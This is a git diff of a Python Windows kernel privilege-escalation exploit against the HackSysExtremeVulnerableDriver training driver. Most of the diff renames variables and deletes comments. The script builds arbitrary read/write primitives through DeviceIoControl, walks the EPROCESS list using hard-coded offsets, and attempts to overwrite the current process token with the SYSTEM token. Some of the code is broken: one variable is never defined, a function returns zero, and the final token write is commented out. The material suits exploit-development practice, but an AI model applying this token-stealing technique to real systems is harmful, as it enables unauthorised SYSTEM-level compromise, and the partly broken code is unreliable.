@@ -78,6 +78,7 @@ ntdll.NtQueryInformationThread.argtypes = [c_void_p, c_ulonglong,
 
 STATUS_SUCCESS = 0
 written = c_size_t()
+read = c_size_t()
 
 dwStatus = ntdll.NtAllocateVirtualMemory(
     CURRENT_PROCESS_HANDLE,
@@ -87,8 +88,6 @@ dwStatus = ntdll.NtAllocateVirtualMemory(
     MEM_COMMIT | MEM_RESERVE,
     PAGE_EXECUTE_READWRITE,
     )
-
-# If not zero (True), something didn't work.
 
 if dwStatus != STATUS_SUCCESS:
     print ('Something went wrong while allocating memory', 'e')
@@ -170,13 +169,13 @@ def get_PsISP_kernel_address(kernel_base, img_name):
 
     # Calculate PsInitialSystemProcess offset in kernel land
 
-    system_process_base_pointer = kernel_base + PsISP_User_Address - kernel_handle
-    print '[+] PsInitialSystemProcess Kernel Base Address: 0x%X' % system_process_base_pointer
+    system_proc_struct_base_ptr = kernel_base + PsISP_User_Address - kernel_handle
+    print '[+] PsInitialSystemProcess Kernel Base Address: 0x%X' % system_proc_struct_base_ptr
 
     PsISP_kernel_address = c_ulonglong()
 
 
-    return long(system_process_base_pointer)
+    return long(system_proc_struct_base_ptr)
 
 
 ################################################### WRITE ###########################################################
@@ -184,6 +183,7 @@ def get_PsISP_kernel_address(kernel_base, img_name):
 def writeQWORD(driver, what=0x4141414141414141, USER_MEM_PAGE_PTR=0x4242424242424242):
     
     # Write the what value to WHAT_ADDR
+
     data = struct.pack("<Q", what)
     dwStatus = kernel32.WriteProcessMemory(CURRENT_PROCESS_HANDLE, WHAT_ADDR, data, len(data), byref(written))
     
@@ -192,22 +192,17 @@ def writeQWORD(driver, what=0x4141414141414141, USER_MEM_PAGE_PTR=0x424242424242
         sys.exit()
 
     # Pack the address of the what value and the USER_MEM_PAGE_PTR address
+
     data = struct.pack("<Q", WHAT_ADDR) + struct.pack("<Q", USER_MEM_PAGE_PTR)
     dwStatus = kernel32.WriteProcessMemory(CURRENT_PROCESS_HANDLE, USER_ADDR, data, len(data), byref(written))
     if dwStatus == 0:
         print("Something went wrong while writing to memory in the packing section","e")
         sys.exit()
     
-
-    #IOCTL
     IoControlCode = IOCTL_code
-    #USER_MEM_PAGE_PTR
     InputBuffer = c_void_p(USER_ADDR)
-    # I THINK this should work? 
-    InputBufferLength = 0x10 # can't take length of a void pointer len(InputBuffer) 
-    # If our buffer length is zero can't we set OutputBuffer to None?
+    InputBufferLength = 0x10
     OutputBuffer = c_void_p(0x0)
-    # The OutputBufferLength is already set to zero. I think we can get rid of this?
     OutputBufferLength = 0x0
     dwBytesReturned = c_ulong()
     lpBytesReturned = byref(dwBytesReturned)
@@ -223,8 +218,6 @@ def writeQWORD(driver, what=0x4141414141414141, USER_MEM_PAGE_PTR=0x424242424242
 
 def readPrimitive(driver, WHAT_ADDR, USER_MEM_PAGE_PTR):
 
-    # We've created a block of memory at the top of userland via dwStatus
-
     IoControlCode = IOCTL_code
     InputBuffer = c_void_p(1)
     InputBufferLength = 0x10
@@ -233,16 +226,10 @@ def readPrimitive(driver, WHAT_ADDR, USER_MEM_PAGE_PTR):
     dwBytesReturned = c_ulong()
     lpBytesReturned = byref(dwBytesReturned)
 
-                                                            # THIS SHOULD BE USER_ADDR, OUR USER MEMORY PAGE
-    
-    #print "WHAT: ", type(WHAT_ADDR), hex(WHAT_ADDR)
-    #print "USER_MEM_PAGE_PTR: ", type(USER_MEM_PAGE_PTR), hex(USER_MEM_PAGE_PTR)
-
     data = struct.pack('<QQ', WHAT_ADDR, USER_MEM_PAGE_PTR)
     dwStatus = kernel32.WriteProcessMemory(CURRENT_PROCESS_HANDLE,
             USER_ADDR, data, len(data), byref(written))
 
-    #print 'Value before DeviceIoControl: %08x' % cast(USER_ADDR, POINTER(c_ulonglong))[0]
 
     triggerIOCTL = kernel32.DeviceIoControl(
         driver,
@@ -254,67 +241,41 @@ def readPrimitive(driver, WHAT_ADDR, USER_MEM_PAGE_PTR):
         lpBytesReturned,
         NULL,
         )
-
-    #print 'Value after: %08x' % cast(USER_ADDR, POINTER(c_ulonglong))[0]
  
     process_struct_ptr = cast(USER_ADDR, POINTER(c_ulonglong))[0]
-    #print type(process_struct_ptr)
-    #print ("process_struct_ptr is: " + hex(process_struct_ptr))
 
-    #return (triggerIOCTL, process_struct_ptr)
     return process_struct_ptr
 
 ############################## GET CURRENT PROCESS TOKEN OFFSET ################################
 
-def get_current_eprocess(system_process_base_pointer, driver):
+def get_current_eprocess(system_proc_struct_base_ptr, driver):
     """ Returns ptr to Current EPROCESS structure """
     PID_OFFSET = 0x2e0
     PROC_FLINK_OFFSET = 0x2e8
     TOKEN_OFFSET = 0x358
 
-    flink = readPrimitive(driver, system_process_base_pointer + PROC_FLINK_OFFSET, USER_ADDR)
-    print hex(flink)
-    #stop = flink
+    flink = readPrimitive(driver, system_proc_struct_base_ptr + PROC_FLINK_OFFSET, USER_ADDR)
+
     currentprocessBase = 0
 
-        #unique_process_id = c_ulonglong(0)
+    system_proc_struct_base_ptr = flink - PID_OFFSET - 0x8
 
-        # Adjust EPROCESS pointer for next entry
+    print "System Process Base Pointer", type(system_proc_struct_base_ptr), hex(system_proc_struct_base_ptr)
 
-        #print("Flink.value {}".format(flink.value))
-        #system_process_base_pointer = flink.value - PID_OFFSET - 0x8
-    system_process_base_pointer = flink - PID_OFFSET - 0x8
-
-    print "System Process Base Pointer", type(system_process_base_pointer), hex(system_process_base_pointer)
-        # Get PID
-
-    #unique_process_id = readPrimitive(driver, system_process_base_pointer + PID_OFFSET, USER_ADDR)
     print "Process ID: ", unique_process_id
 
     print c_ulonglong(unique_process_id).value
-        # Check if we're in the current process
 
-        #if os.getpid() == unique_process_id:
-            #print "Our Process ID is: ", os.getpid()
-            #currentprocessBase = system_process_base_pointer
-            #break
-
-    flink = readPrimitive(driver, system_process_base_pointer + PROC_FLINK_OFFSET, USER_ADDR)
+    flink = readPrimitive(driver, system_proc_struct_base_ptr + PROC_FLINK_OFFSET, USER_ADDR)
 
     print "Flink ", hex(flink)
         
-        # If next same as last, we've reached the end
-
-        #base_pointer = flink.value - PID_OFFSET - 0x8
     base_pointer = flink - PID_OFFSET - 0x8
-    #if base_pointer == system_process_base_pointer:
-            #break
 
     return long(currentprocessBase)
 
 ####################################### GET DRIVER HANDLE ######################################
 def getDriver():
-        # This is a fixed address in our userland memory page.
 
     driver = kernel32.CreateFileA(
         '\\\\.\\HackSysExtremeVulnerableDriver',
@@ -348,26 +309,26 @@ def executeOverwrite():
         # Get system process base.
 
         print "MAIN Got Kernel Base, Getting System Process Base!"
-        system_process_base_pointer = get_PsISP_kernel_address(kernel_base, img_name)
+        system_proc_struct_base_ptr = get_PsISP_kernel_address(kernel_base, img_name)
 
         # Read the value of that token.
 
         print "MAIN Got System Process Base, Getting System Token!"
-        #triggerIOCTL, process_struct_ptr = readPrimitive(driver, system_process_base_pointer, USER_ADDR)
 
-        process_struct_ptr = readPrimitive(driver, system_process_base_pointer, USER_ADDR)
+        #triggerIOCTL, process_struct_ptr = readPrimitive(driver, system_proc_struct_base_ptr, USER_ADDR)
+
+        process_struct_ptr = readPrimitive(driver, system_proc_struct_base_ptr, USER_ADDR)
 
         
         # Define our expected offsets for this version of Windows.
-
 
         PROC_FLINK_OFFSET = 0x2e8
         TOKEN_OFFSET = 0x358
 
         print "MAIN We know the proper offsets now."
-        system_token = system_process_base_pointer + TOKEN_OFFSET
+        system_token = system_proc_struct_base_ptr + TOKEN_OFFSET
 
-        process_base_pointer = system_process_base_pointer
+        current_proc_base_struct_ptr = system_proc_struct_base_ptr
 
         counter = 0
 
@@ -377,24 +338,19 @@ def executeOverwrite():
                 break
             counter+=1
 
-            next_proc_struct = readPrimitive(driver, process_base_pointer + PROC_FLINK_OFFSET, USER_ADDR)
-            if next_proc_struct == system_process_base_pointer:
+            next_proc_struct = readPrimitive(driver, current_proc_base_struct_ptr + PROC_FLINK_OFFSET, USER_ADDR)
+            if next_proc_struct == system_proc_struct_base_ptr:
                 break
      
-            process_base_pointer = next_proc_struct
+            current_proc_base_struct_ptr = next_proc_struct
 
-            print "Process Base Pointer", type(process_base_pointer), hex(process_base_pointer)
+            print "Process Base Pointer", type(current_proc_base_struct_ptr), hex(current_proc_base_struct_ptr)
 
-            current_token = process_base_pointer + TOKEN_OFFSET
+            current_token = current_proc_base_struct_ptr + TOKEN_OFFSET
 
-            #print type(process_struct_ptr)
-            #whatStr = str(hex(process_struct_ptr))
-            #print "This is what in string format: " + whatStr
-            #what = int((whatStr), 0) #figure out the base for me - throws a fit if its base 10
-            what = process_struct_ptr #figure out the base for me - throws a fit if its base 10
+            what = process_struct_ptr 
             writeQWORD(driver, what, USER_MEM_PAGE_PTR)
-            # Write the system_token over our current_token for SYSTEM privileges.
-            print "MAIN Attempting system to current token overwrite!"
+            #print "MAIN Attempting system to current token overwrite!"
 
             #success = writePrimitive(driver, system_token, current_token, system_token)
 
@@ -402,4 +358,3 @@ def executeOverwrite():
 ############################################ RUN ################################################
 
 executeOverwrite()
-
